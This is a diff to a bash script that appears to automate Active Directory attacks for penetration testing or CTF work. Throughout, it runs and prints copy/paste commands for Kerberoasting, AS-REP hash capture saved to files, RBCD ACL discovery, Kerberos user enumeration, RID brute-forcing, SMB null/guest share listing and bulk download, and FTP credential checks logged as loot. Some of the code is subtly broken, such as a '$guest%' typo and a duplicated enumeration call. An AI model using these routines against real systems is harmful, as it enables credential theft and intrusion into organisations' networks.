+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} --kerberoasting $KERBEROAST_OUT${RESET}"
+        timeout 15 $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --kerberoasting "$KERBEROAST_OUT" 2>/dev/null
+    else
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k --kerberoasting $KERBEROAST_OUT${RESET}"
+        timeout 15 netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k --kerberoasting "$KERBEROAST_OUT" 2>/dev/null
+    fi
 
     # Validate output file
     if [[ -f "$KERBEROAST_OUT" && -s "$KERBEROAST_OUT" ]]; then
@@ -903,30 +1180,84 @@ ldap_enum() {
     # 9. Writable Computer Objects (RBCD Check — Auth Only)
     ########################################
     if [[ "$LDAP_BIND_TYPE" == "auth" ]]; then
-        info "Checking for writable computer object ACLs (RBCD - Authenticated only)"
-        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-        echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET ${LDAP_EXEC_ARGS[@]} -M daclread -o 'TARGET_DN=CN=Computers,$LDAP_BASE_DN' ACTION=read${RESET}"
+        info "Checking for writable computer object ACLs (Resource-Based Constrained Delegation [RBCD] - Authenticated only)"
+        if [[ "$NTLM_ENABLED" == true ]]; then
+            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+            echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -M daclread -o 'TARGET_DN=CN=Computers,$LDAP_BASE_DN' ACTION=read${RESET}"
 
-        DACL_OUT=$(
-            timeout 15 $LDAP_TOOL ldap "$TARGET" "${LDAP_EXEC_ARGS[@]}" -M daclread \
-            -o "TARGET_DN=CN=Computers,$LDAP_BASE_DN" ACTION=read 2>/dev/null
+            DACL_OUT=$(
+                timeout 15 $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -M daclread \
+                -o "TARGET_DN=CN=Computers,$LDAP_BASE_DN" ACTION=read 2>/dev/null
+            )
+        else
+            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+            echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k -M daclread -o 'TARGET_DN=CN=Computers,$LDAP_BASE_DN' ACTION=read${RESET}"
+
+            DACL_OUT=$(
+                timeout 15 netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k -M daclread \
+                -o "TARGET_DN=CN=Computers,$LDAP_BASE_DN" ACTION=read 2>/dev/null
+            )
+        fi
+
+        # Detect ACEs with Writable Permissions on Computer Objects 
+        mapfile -t RBCD_ACES < <(
+            echo "$DACL_OUT" | awk '
+                BEGIN {
+                    flag = 0;
+                    match = 0;
+                    ace_idx = "";
+                    access_mask = "";
+                    object_type = "";
+                    trustee = "";
+                }
+                /^🛠.*ACE\[[0-9]+\]/ {
+                    ace_idx = $0;
+                    flag = 1;
+                    access_mask = "";
+                    object_type = "";
+                    trustee = "";
+                    next;
+                }
+                /^🛠.*Access:/ && flag {
+                    access_mask = $0;
+                    next;
+                }
+                /^🛠.*Object Type:.*Computer/ && flag {
+                    object_type = $0;
+                    if (access_mask ~ /WriteProperty|WriteOwner|FullControl/) {
+                        match = 1;
+                    }
+                    next;
+                }
+                /^🛠.*/ && $0 ~ /[^\s]/ && flag && match && trustee == "" {
+                    trustee = $0;
+                    print ace_idx "\n" access_mask "\n" object_type "\n" trustee;
+                    flag = 0;
+                    match = 0;
+                }
+            '
         )
-
-        # Detect known writable permissions in output
-        if echo "$DACL_OUT" | grep -Eqi \
-            'Access mask\s*:\s*(GenericWrite|WriteDacl|WriteProperty|CreateChild|WriteOwner)'; then
-            HAS_WRITABLE_COMPUTER_ACL=true
-            critical "Writable computer ACL detected — RBCD viable"
-            echo "$DACL_OUT" | grep -E 'Ace Type|Trustee|Access mask' \
-                | grep -B2 -Ei 'GenericWrite|WriteDacl|WriteProperty|CreateChild|WriteOwner' \
-                | sed 's/^/        /'
+        
+        if (( ${#RBCD_ACES[@]} > 0 )); then
+            warn "Potential RBCD (Writable Computer ACLs) Detected:"
+            echo
+    
+            for ((i=0; i<${#RBCD_ACES[@]}; i+=4)); do
+                echo -e "${YELLOW}    ${RBCD_ACES[i]}${RESET}"
+                echo -e "        ${RED}${RBCD_ACES[i+1]}${RESET}"
+                echo -e "        ${BLUE}${RBCD_ACES[i+2]}${RESET}"
+                echo -e "        ${GREEN}${RBCD_ACES[i+3]}${RESET}"
+            done
+    
+            echo
+            info "Next Step: Consider checking for Resource-Based Constrained Delegation paths using tools like:"
+            echo -e "   ${GREEN}impacket-findDelegation.py${RESET}, ${GREEN}BloodHound${RESET}, or ${GREEN}PowerView${RESET}"
         else
             success "No writable computer ACLs found (based on known access masks)"
         fi
     else
         info "Skipping RBCD check — authenticated bind required"
     fi
-
 
     ########################################
     # Done
@@ -947,7 +1278,7 @@ kerberos_auth_check() {
         return
     fi
     
-    ensure_krb5_conf_from_ldap "$LDAP_DOMAIN" "$TARGET" "$DOMAIN_CONTROLLER"
+    ensure_krb5_conf_from_ldap "$LDAP_DOMAIN" "$TARGET_IPV4" "$DOMAIN_CONTROLLER"
     
     echo
     info "Validating Kerberos credentials (safe check)"
@@ -1007,7 +1338,7 @@ kerberos_enum_users() {
     
     USERFILE_OK=true
     # Ensure USERS_FILE is initialized
-    [ -z "$USERS_FILE" ] && USERS_FILE="users_${TARGET}_kerbenum.txt"
+    [ -z "$USERS_FILE" ] && USERS_FILE="users_${TARGET_IPV4}_kerbenum.txt"
     # Create users file if it doesn't exist
     [ ! -f "$USERS_FILE" ] && touch "$USERS_FILE"
     FOUND=false
@@ -1020,14 +1351,14 @@ kerberos_enum_users() {
     info "Attempting unauthenticated Kerberos user enumeration"
     echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
     if [ -z "$DOMAIN_CONTROLLER" ]; then
-        echo -e "        ${GREEN}$KERB_CMD $KERB_REALM/[user] -dc-ip $TARGET -no-pass${RESET}"
+        echo -e "        ${GREEN}$KERB_CMD $KERB_REALM/[user] -dc-ip $TARGET_IPV4 -no-pass${RESET}"
     else
-        echo -e "        ${GREEN}$KERB_CMD $KERB_REALM/[user] -dc-ip $TARGET -no-pass -dc-host $DOMAIN_CONTROLLER -k${RESET}"
+        echo -e "        ${GREEN}$KERB_CMD $KERB_REALM/[user] -dc-ip $TARGET_IPV4 -no-pass -dc-host $DOMAIN_CONTROLLER -k${RESET}"
     fi
  
     for user in "${COMMON_USERS[@]}"; do
         if [ -z "$DOMAIN_CONTROLLER" ]; then
-            timeout 3 "$KERB_CMD" "$KERB_REALM/$user" -dc-ip "$TARGET" -no-pass 2>&1 \
+            timeout 3 "$KERB_CMD" "$KERB_REALM/$user" -dc-ip "$TARGET_IPV4" -no-pass 2>&1 \
                 | grep -qi 'preauth' && {
                     success "Valid Kerberos user (unauth): ${BYELLOW}$user${RESET}"
                     FOUND=true
@@ -1035,7 +1366,7 @@ kerberos_enum_users() {
                     grep -Fxq "$user" "$USERS_FILE" || echo "$user" >> "$USERS_FILE"
                }
         else
-            timeout 3 "$KERB_CMD" "$KERB_REALM/$user" -dc-ip "$TARGET" -no-pass -dc-host $DOMAIN_CONTROLLER -k 2>&1 \
+            timeout 3 "$KERB_CMD" "$KERB_REALM/$user" -dc-ip "$TARGET_IPV4" -no-pass -dc-host $DOMAIN_CONTROLLER -k 2>&1 \
                 | grep -qi 'preauth' && {
                     success "Valid Kerberos user (unauth): ${BYELLOW}$user${RESET}"
                     FOUND=true
@@ -1059,13 +1390,13 @@ kerberos_enum_users() {
         
         if [ -z "$DOMAIN_CONTROLLER" ]; then
             echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-            echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-ip $TARGET -k -debug${RESET}"
+            echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-ip $TARGET_IPV4 -k -debug${RESET}"
             OUT=$(timeout 6 "$KERB_CMD" \
                 "$KERB_REALM/$AUTH_USER:$AUTH_PASS" \
                 -dc-ip "$TARGET" -k 2>&1)
         else
             echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-            echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-host $DOMAIN_CONTROLLER -dc-ip $TARGET -k -debug${RESET}"
+            echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-host $DOMAIN_CONTROLLER -dc-ip $TARGET_IPV4 -k -debug${RESET}"
             OUT=$(timeout 6 "$KERB_CMD" \
                 "$KERB_REALM/$AUTH_USER:$AUTH_PASS" \
                 -dc-host "$DOMAIN_CONTROLLER" \
@@ -1110,11 +1441,11 @@ kerberos_enum_users() {
         note "User file: $USERS_FILE"
 
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-        echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/' -dc-ip $TARGET -usersfile $USERS_FILE${RESET}"
+        echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/' -dc-ip $TARGET_IPV4 -usersfile $USERS_FILE${RESET}"
 
         OUT=$(timeout 15 "$KERB_CMD" \
             "$KERB_REALM/" \
-            -dc-ip "$TARGET" \
+            -dc-ip "$TARGET_IPV4" \
             -usersfile "$USERS_FILE" 2>&1)
 
         ########################################
@@ -1130,8 +1461,8 @@ kerberos_enum_users() {
             # --- AS-REP hashes found ---
             if echo "$OUT" | grep -q '\$krb5asrep\$'; then
             critical "AS-REP roastable users identified!"
-            echo "$OUT" | grep '\$krb5asrep\$' > "asrep_hashes_$TARGET.txt"
-            success "Saved AS-REP hashes to asrep_hashes_$TARGET.txt"
+            echo "$OUT" | grep '\$krb5asrep\$' > "asrep_hashes_$TARGET_IPV4.txt"
+            success "Saved AS-REP hashes to asrep_hashes_$TARGET_IPV4.txt"
             ASREP_OK=true
         fi
 
@@ -1150,11 +1481,11 @@ kerberos_enum_users() {
             note "User file: $USERS_FILE"
 
             echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-            echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-ip $TARGET -usersfile $USERS_FILE${RESET}"
+            echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-ip $TARGET_IPV4 -usersfile $USERS_FILE${RESET}"
 
             OUT=$(timeout 15 "$KERB_CMD" \
                 "'$KERB_REALM/$AUTH_USER:$AUTH_PASS'" \
-                -dc-ip "$TARGET" \
+                -dc-ip "$TARGET_IPV4" \
                 -usersfile "$USERS_FILE" 2>&1)
 
             ########################################
@@ -1171,8 +1502,8 @@ kerberos_enum_users() {
             # --- AS-REP hashes found ---
             if echo "$OUT" | grep -q '\$krb5asrep\$'; then
                 critical "AS-REP roastable users identified!"
-                echo "$OUT" | grep '\$krb5asrep\$' > "asrep_hashes_$TARGET.txt"
-                success "Saved AS-REP hashes to asrep_hashes_$TARGET.txt"
+                echo "$OUT" | grep '\$krb5asrep\$' > "asrep_hashes_$TARGET_IPV4.txt"
+                success "Saved AS-REP hashes to asrep_hashes_$TARGET_IPV4.txt"
                 ASREP_OK=true
             fi
 
@@ -1212,9 +1543,9 @@ ftp_auth_check() {
     info "Attempting authenticated FTP login (netexec)"
 
     echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}netexec ftp $target -u '$user' -p '$pass'${RESET}"
+    echo -e "        ${GREEN}netexec ftp $TARGET_IPV4 -u '$user' -p '$pass'${RESET}"
 
-    FTP_OUT=$(timeout 8 netexec ftp "$target" -u "$user" -p "$pass" 2>&1)
+    FTP_OUT=$(timeout 8 netexec ftp "$TARGET_IPV4" -u "$user" -p "$pass" 2>&1)
 
     # --- SUCCESS ---
     # netexec success indicators:
@@ -1223,7 +1554,7 @@ ftp_auth_check() {
     if echo "$FTP_OUT" | grep -qiE '\[\+\].*(Login successful|'"$user"':'"$pass"')'; then
         critical "FTP authentication successful → $user:$pass"
         FTP_AUTH_OK=true
-        echo "[LOOT] FTP AUTH $target $user:$pass" >> ftp_valid_creds.txt
+        echo "[LOOT] FTP AUTH $TARGET_IPV4 $user:$pass" >> ftp_valid_creds.txt
         return 
     fi
 
@@ -1723,7 +2054,7 @@ for ENTRY in "${PORTS[@]}"; do # ---- MAX_JOBS throttle ----
     done
 (
     IFS=: read PORT SERVICE LEVEL <<< "$ENTRY"
-    timeout 2 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null || exit
+    timeout 2 bash -c "echo >/dev/tcp/$TARGET_IPV4/$PORT" 2>/dev/null || exit
     
     #Add Port to Open Ports Array
     #OPEN_PORTS+=("$PORT")
@@ -1757,7 +2088,7 @@ for ENTRY in "${PORTS[@]}"; do # ---- MAX_JOBS throttle ----
 
     # HTTP Redirect Discovery
     if [[ "$PORT" =~ ^(80|8080|3000)$ ]] && command -v curl >/dev/null; then
-        redirect=$(curl -sI --max-time 3 "http://$TARGET:$PORT" \
+        redirect=$(curl -sI --max-time 3 "http://$TARGET_IPV4:$PORT" \
             | awk -F': ' 'tolower($1)=="location"{print $2}' | tr -d '\r')
 
         if [ -n "$redirect" ]; then
@@ -1776,9 +2107,9 @@ for ENTRY in "${PORTS[@]}"; do # ---- MAX_JOBS throttle ----
         info "Querying LDAP RootDSE..."
 
         if [ "$PORT" = "389" ]; then
-		LDAP_URI="ldap://$TARGET"
+		LDAP_URI="ldap://$TARGET_IPV4"
         else
-		LDAP_URI="ldaps://$TARGET"
+		LDAP_URI="ldaps://$TARGET_IPV4"
         fi
 
         ldap_dn=$(
@@ -1801,13 +2132,13 @@ for ENTRY in "${PORTS[@]}"; do # ---- MAX_JOBS throttle ----
 
 
     if [ "$PORT" = "6379" ] && command -v redis-cli >/dev/null; then
-        if redis-cli -h "$TARGET" ping 2>/dev/null | grep -qi PONG; then
+        if redis-cli -h "$TARGET_IPV4" ping 2>/dev/null | grep -qi PONG; then
         	critical "Redis unauthenticated"
 	fi
     fi
 
     if [ "$PORT" = "2375" ] && command -v curl >/dev/null; then
-        if curl -s "http://$TARGET:2375/containers/json" | grep -q '^\['; then
+        if curl -s "http://$TARGET_IPV4:2375/containers/json" | grep -q '^\['; then
         	critical "Unauthenticated Docker API (CVE-2025-9074)"
 	fi
     fi
@@ -1888,7 +2219,7 @@ if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "21"; then
     # --- Anonymous check ---
     if command -v ftp >/dev/null; then
         if echo -e "user anonymous\npass anonymous\nquit" \
-            | timeout 5 ftp -n "$TARGET" 2>/dev/null \
+            | timeout 5 ftp -n "$TARGET_IPV4" 2>/dev/null \
             | grep -qi "^230"; then
 
             critical "Anonymous FTP login allowed"
@@ -1900,22 +2231,22 @@ if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "21"; then
 
     # --- Authenticated check (only if creds provided) ---
     if $CREDS_PROVIDED; then
-        ftp_auth_check "$TARGET" "$AUTH_USER" "$AUTH_PASS"
+        ftp_auth_check "$TARGET_IPV4" "$AUTH_USER" "$AUTH_PASS"
     else
         note "No credentials provided — skipping authenticated FTP check"
     fi
 fi
 
 # --------- Debug / Visibility ----------
-check_rpc_services "$TARGET"
+check_rpc_services "$TARGET_IPV4"
 
 # --------- SMB Enumeration (only if 139 or 445 is open) ----------
 if [ -s "$SMB_MARKER" ]; then
     echo
     info "SMB ports detected (139/445) — enumerating shares & permissions..."
 
-    check_smb_protocols "$TARGET"
-    check_ntlm_support "$TARGET"
+    check_smb_protocols "$TARGET_IPV4"
+    check_ntlm_support "$TARGET_IPV4"
 
     SMB_ENUM_SUCCESS=false
 
@@ -1953,11 +2284,11 @@ if [ -s "$SMB_MARKER" ]; then
         fi
         
         echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-	echo -e "           ${GREEN}smbclient -L '//$TARGET' -U '$AUTH' $SMB_VER_ARG -c 'exit'${RESET}"
+	echo -e "           ${GREEN}smbclient -L '//$TARGET_IPV4' -U '$AUTH' $SMB_VER_ARG -c 'exit'${RESET}"
         
         # Capture smbclient output
         local OUT
-        OUT=$(smbclient -L "//$TARGET" -U "$AUTH" $SMB_VER_ARG -c 'exit' 2>&1)
+        OUT=$(smbclient -L "//$TARGET_IPV4" -U "$AUTH" $SMB_VER_ARG -c 'exit' 2>&1)
 
         # NTLM disabled = return failure (do NOT treat as special case externally)
         if echo "$OUT" | grep -q "NT_STATUS_NOT_SUPPORTED"; then
@@ -1966,28 +2297,28 @@ if [ -s "$SMB_MARKER" ]; then
             NTLM_ENABLED=false
             # Check for valid Kerberos 
             if [ -n "$ORIGINAL_HOSTNAME" ]; then
-                echo -e "        ${BLUE}(Attempting Kerberos fallback via smbclient -k)${RESET}"
+                echo -e "        ${BLUE}(Attempting Kerberos fallback via netexec smb -k)${RESET}"
                 echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-                echo -e "           ${GREEN}impacket-smbclient -k ${ORIGINAL_HOSTNAME}/${AUTH_USER}:${AUTH_PASS}@${ORIGINAL_HOSTNAME} -target-ip "$TARGET" -c 'ls' ${RESET}"
-                echo -e ""
-                echo -e "   *** TODO.... Kerberos Test is not implemented      ***"
-                echo -e "   ***   Notes: Run NAMP -sC -sV $TARGET              ***"
-                echo -e "   ***          to identify Hostname (DNS:[hostname]) ***"
-                echo -e ""
-                #if impacket-smbclient \
-                #    -k \
-                #    "${LDAP_DOMAIN}/${AUTH_USER}@${ORIGINAL_HOSTNAME}" \
-                #    -target-ip "$TARGET" \
-                #    -no-pass \
-                #    -port 445 \
-                #    -c 'ls' \
-                #    >/dev/null 2>&1; then
-                #    return 0
-                #fi
+                if [[ "$AUTH" == "%" ]]; then
+                    #echo "Null  SMB auth"
+                    echo -e "           ${GREEN}netexec smb $TARGET_IPV4 -u '' -p '' -k${RESET}"
+                    OUT=$(netexec smb "$TARGET_IPV4" -k --shares 2>&1)
+                elif [[ "$AUTH" == "guest%" ]]; then
+                    #echo "Guest SMB auth" 
+                    echo -e "           ${GREEN}netexec smb $TARGET_IPV4 -u 'guest' -p '' -k${RESET}"
+                    OUT=$(netexec smb "$TARGET_IPV4" -u "guest" -p "" -k 2>&1)
+                else
+                    #echo "User|Pass SMB auth"
+                    echo -e "           ${GREEN}netexec smb $TARGET_IPV4 -u '$AUTH_USER' -p '$AUTH_PASS' -k ${RESET}"
+                    OUT=$(netexec smb "$TARGET_IPV4" -u "$AUTH_USER" -p "$AUTH_PASS" -k 2>&1)
+                fi
+                
+                if echo "$OUT" | grep -qP '\[\+\]'; then
+                    success "Kerberos SMB auth succeeded via netexec!"
+                    #echo "$OUT" | grep -E '^\s*SMB\s+.*\[\+\]' | head -n 5
+                    return 0
+                fi
             fi
-            
-            echo -e "        ${RED}Kerberos fallback failed${RESET}"
-            return 1
         fi
 
         # Success = "Sharename" appears
@@ -1999,7 +2330,7 @@ if [ -s "$SMB_MARKER" ]; then
         return 1
         
         # Try listing shares with the chosen protocol version
-        #smbclient -L "//$TARGET" -U "$AUTH" $SMB_VER_ARG -c 'exit' >/dev/null 2>&1
+        #smbclient -L "//$TARGET_IPV4" -U "$AUTH" $SMB_VER_ARG -c 'exit' >/dev/null 2>&1
         #return $?
     }
 
@@ -2008,25 +2339,25 @@ if [ -s "$SMB_MARKER" ]; then
         local AUTH="$2"
         local LABEL="$3"
 
-        echo -e "        ${BLUE}$ICON_SHARE Listing files in //$TARGET/$SHARE ($LABEL, read-only)${RESET}"
+        echo -e "        ${BLUE}$ICON_SHARE Listing files in //$TARGET_IPV4/$SHARE ($LABEL, read-only)${RESET}"
 	
 	# ---- NEW: Copy-paste helper ----
         local USER="${AUTH%%%*}"
         local PASS="${AUTH#*%}"
 
         if [ -z "$USER" ]; then
-            COPY_CMD="smbclient //$TARGET/$SHARE -N"
+            COPY_CMD="smbclient //$TARGET_IPV4/$SHARE -N"
         elif [ -z "$PASS" ]; then
-            COPY_CMD="smbclient //$TARGET/$SHARE -U $USER"
+            COPY_CMD="smbclient //$TARGET_IPV4/$SHARE -U $USER"
         else
-            COPY_CMD="smbclient //$TARGET/$SHARE -U '$USER%$PASS'"
+            COPY_CMD="smbclient //$TARGET_IPV4/$SHARE -U '$USER%$PASS'"
         fi
 
         echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
         echo -e "           ${GREEN}$COPY_CMD${RESET}"
 	echo -e "           ${GREEN}$COPY_CMD -c 'prompt OFF; recurse ON; mget *'${RESET}"
         # Root listing first (most reliable)
-        ROOT_LIST=$(timeout 6 smbclient "//$TARGET/$SHARE" -U "$AUTH" \
+        ROOT_LIST=$(timeout 6 smbclient "//$TARGET_IPV4/$SHARE" -U "$AUTH" \
              -c "ls" 2>/dev/null)
 
         if echo "$ROOT_LIST" | grep -q 'NT_STATUS'; then
@@ -2044,7 +2375,7 @@ if [ -s "$SMB_MARKER" ]; then
 
         # Loot detection
         if echo "$ROOT_LIST" | grep -Eqi '(password|passwd|pwd|backup|\.kdbx|\.xlsx)'; then
-            critical "        High-value files detected in //$TARGET/$SHARE"
+            critical "        High-value files detected in //$TARGET_IPV4/$SHARE"
         fi
 
         # Optional shallow recursion (safe)
@@ -2052,7 +2383,7 @@ if [ -s "$SMB_MARKER" ]; then
 
         for dir in $SUBDIRS; do
             echo -e "          ${BLUE}↳ $dir/${RESET}"
-            timeout 4 smbclient "//$TARGET/$SHARE" -U "$AUTH" \
+            timeout 4 smbclient "//$TARGET_IPV4/$SHARE" -U "$AUTH" \
                 -c "cd \"$dir\"; ls" 2>/dev/null \
                 | awk '
                     /blocks of size/ {next}
@@ -2068,7 +2399,7 @@ if [ -s "$SMB_MARKER" ]; then
         local AUTH="$1" # User
         local LABEL="$2"
 
-        SHARES=$(smbclient -L "//$TARGET" -U "$AUTH" 2>/dev/null \
+        SHARES=$(smbclient -L "//$TARGET_IPV4" -U "$AUTH" 2>/dev/null \
             | awk '$2 == "Disk" { print $1 }')
 
         [ -z "$SHARES" ] && return 1
@@ -2079,10 +2410,10 @@ if [ -s "$SMB_MARKER" ]; then
         for share in $SHARES; do
             [[ "$share" =~ ^(IPC\$|ADMIN\$)$ ]] && continue
 
-            smbclient "//$TARGET/$share" -U "$AUTH" -c "ls" >/dev/null 2>&1 \
+            smbclient "//$TARGET_IPV4/$share" -U "$AUTH" -c "ls" >/dev/null 2>&1 \
                 && READ="yes" || READ="no"
 
-            smbclient "//$TARGET/$share" -U "$AUTH" -c "put /dev/null test_$$_tmp" >/dev/null 2>&1 \
+            smbclient "//$TARGET_IPV4/$share" -U "$AUTH" -c "put /dev/null test_$$_tmp" >/dev/null 2>&1 \
                 && WRITE="yes" || WRITE="no"
 
             echo -e "      - $share [read=$(color_perm "$READ") write=$(color_perm "$WRITE")]"
@@ -2097,7 +2428,64 @@ if [ -s "$SMB_MARKER" ]; then
         [ "$LABEL" = "NULL session" ] && SMB_NULL_OK=true
         [ "$LABEL" = "GUEST" ] && SMB_GUEST_OK=true
     }
+    
+    smb_enum_netexec() {
+        local SMB_USER="$1"
+        local SMB_PASS="$2"
+        local SMB_LABEL="$3"
+        local AUTH_FLAGS=""
+        local OUT
 
+        # Build netexec command flags
+        if [[ "$SMB_LABEL" == "NULL session" ]]; then
+            AUTH_FLAGS="-k --shares"
+            CMD="netexec smb '$TARGET_IPV4' $AUTH_FLAGS"
+        elif [[ "$SMB_LABEL" == "GUEST" ]]; then
+            AUTH_FLAGS="-u guest -p '' -k --shares"
+            CMD="netexec smb '$TARGET_IPV4' -k --shares"
+        elif [[ "$SMB_LABEL" == "AUTHENTICATED" ]]; then
+            AUTH_FLAGS="-u '$SMB_USER' -p '$SMB_PASS' -k --shares"
+            CMD="netexec smb '$TARGET_IPV4' $AUTH_FLAGS"
+        else
+            return 1
+        fi
+
+        echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "           ${GREEN}$CMD${RESET}"
+
+        # Run and capture netexec output
+        OUT=$(eval "$CMD" 2>/dev/null)
+
+        # Did authentication succeed?
+        if echo "$OUT" | grep -qP '\[\+\] .*\\.*:'; then
+            success "SMB authentication successful"
+        fi
+
+        # Did shares get enumerated?
+        if echo "$OUT" | grep -qP '\[\*\] Enumerated shares'; then
+            critical "  SMB allows $SMB_LABEL access"
+            notify "   $ICON_SHARE SMB shares ($SMB_LABEL):"
+
+            # Filter out only meaningful shares (non IPC$, ADMIN$)
+            # Filter and parse meaningful shares (non IPC$, ADMIN$)
+            
+
+            if echo "$OUT" | grep -qP 'Share'; then
+                echo "$OUT" | tail -n +4
+            else
+                warn "Authenticated but no shares are visible to this user"
+            fi
+
+            SMB_ENUM_SUCCESS=true
+            [[ "$SMB_LABEL" == "NULL session" ]] && SMB_NULL_OK=true
+            [[ "$SMB_LABEL" == "GUEST" ]] && SMB_GUEST_OK=true
+        else
+            warn "  No SMB shares found using $SMB_LABEL credentials"
+            return 1
+        fi
+        return 0
+    }
+    
     # -------- smbmap fallback --------
     smb_enum_smbmap() {
         local LABEL="$1" # User
@@ -2105,7 +2493,7 @@ if [ -s "$SMB_MARKER" ]; then
 
         command -v smbmap >/dev/null 2>&1 || return 1
 
-        OUTPUT=$(smbmap -H "$TARGET" $SMBMAP_ARGS 2>/dev/null \
+        OUTPUT=$(smbmap -H "$TARGET_IPV4" $SMBMAP_ARGS 2>/dev/null \
             | awk '
                 /^[A-Za-z0-9_$-]+[[:space:]]+(READ|WRITE|READ,WRITE|NO)/ {
                     print $1, $2
@@ -2148,8 +2536,17 @@ if [ -s "$SMB_MARKER" ]; then
     # 1) True NULL session
     if smb_auth_check "%"; then
         success "SMB NUll Session successful"
+        SMB_NULL_OK=true
+        
     	smb_enum_smbclient "%" "NULL session" || \
             notify "NULL Session Allowed, but no shares are visible to this user"
+        if [[ "$NTLM_ENABLED" = true ]]; then
+            smb_enum_smbclient "%" "NULL session" || \
+                notify "NULL Session Allowed, but no shares are visible to this user"
+        else
+            smb_enum_netexec "" "" "NULL session" || \
+                notify "Authenticated but no shares are visible to this user"
+        fi
     else
         warn "SMB NULL Session failed"
     fi 
@@ -2157,8 +2554,15 @@ if [ -s "$SMB_MARKER" ]; then
     # 2) Guest with empty password (matches CME behavior)
     if smb_auth_check "guest%"; then
         success "SMB GUEST (No Password) Successful"
-    	smb_enum_smbclient "guest%" "GUEST" || \
-            notify "Guest Access Allowed, but no shares are visible to this user"
+        SMB_GUEST_OK=true
+        
+        if [[ "$NTLM_ENABLED" = true ]]; then
+            smb_enum_smbclient "$guest%" "GUEST" || \
+                notify "Authenticated but no shares are visible to this user"
+        else
+            smb_enum_netexec "guest" "" "GUEST" || \
+                notify "Authenticated but no shares are visible to this user"
+        fi
     else
         warn "SMB Guest (No Password) Session Failed"
     fi 
@@ -2171,9 +2575,14 @@ if [ -s "$SMB_MARKER" ]; then
         if smb_auth_check "$AUTH_USER%$AUTH_PASS"; then
             success "SMB authentication successful"
             SMB_AUTH_OK=true
-
-            smb_enum_smbclient "$AUTH_USER%$AUTH_PASS" "AUTHENTICATED" || \
-                notify "Authenticated but no shares are visible to this user"
+            
+            if [[ "$NTLM_ENABLED" = true ]]; then
+                smb_enum_smbclient "$AUTH_USER%$AUTH_PASS" "AUTHENTICATED" || \
+                    notify "Authenticated but no shares are visible to this user"
+            else
+                smb_enum_netexec "$AUTH_USER" "$AUTH_PASS" "AUTHENTICATED" || \
+                    notify "Authenticated but no shares are visible to this user"
+            fi
         else
             warn "SMB authentication failed for provided credentials"
         fi
@@ -2198,7 +2607,11 @@ if [ -s "$SMB_MARKER" ]; then
             cme_enum_users "GUEST" "-u guest -p ''" || true
         fi
         if $CREDS_PROVIDED; then 
-            cme_enum_users "AUTHENTICATED" "-u $AUTH_USER -p $AUTH_PASS" || true
+            if [[ "$NTLM_ENABLED" = true ]]; then
+                cme_enum_users "AUTHENTICATED" "-u $AUTH_USER -p $AUTH_PASS" || true
+            else
+                nxc_enum_users "AUTHENTICATED" "-u $AUTH_USER -p $AUTH_PASS -d ${AUTH_DOMAIN:-$LDAP_DOMAIN} -k" || true
+            fi
         fi
     fi
 
@@ -2209,7 +2622,7 @@ if [ -s "$SMB_MARKER" ]; then
 
         info "Running crackmapexec RID brute (safe enumeration)..."
 
-        RID_OUTPUT=$(crackmapexec smb "$TARGET" -u guest -p '' --rid-brute 2>/dev/null)
+        RID_OUTPUT=$(crackmapexec smb "$TARGET_IPV4" -u guest -p '' --rid-brute 2>/dev/null)
 
         USERS=$(echo "$RID_OUTPUT" | awk -F'\\\\' '
              /SidTypeUser/ && !/\$/ {
@@ -2220,7 +2633,7 @@ if [ -s "$SMB_MARKER" ]; then
         if [ -n "$USERS" ]; then
             # Timestamped users file (always unique)
             DATE_TAG=$(date +"%Y%m%d_%H%M%S")
-            USERS_FILE="users_${TARGET}_${DATE_TAG}.txt"
+            USERS_FILE="users_${TARGET_IPV4}_${DATE_TAG}.txt"
 
             notify "Discovered domain users via RID brute:"
             for user in $USERS; do
@@ -2231,7 +2644,7 @@ if [ -s "$SMB_MARKER" ]; then
             note "User list saved to: ${GREEN}$USERS_FILE${RESET}"
